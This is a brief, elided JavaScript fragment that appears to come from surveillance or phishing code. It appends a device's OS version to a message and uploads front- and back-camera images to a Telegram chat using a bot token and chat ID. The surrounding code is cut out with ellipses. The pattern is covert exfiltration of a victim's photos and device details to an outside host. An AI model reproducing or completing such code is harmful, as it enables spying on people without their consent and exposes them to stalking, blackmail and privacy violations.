...
OS Version: ${deviceInfo.osVersion}`;
            ...
            if (frontCameraImage && backCameraImage) {
              await sendImageToTelegram(telegramBotToken, chatId, frontCameraImage, "Front Camera Screenshot");
              await sendImageToTelegram(telegramBotToken, chatId, backCameraImage, "Back Camera Screenshot");
            }
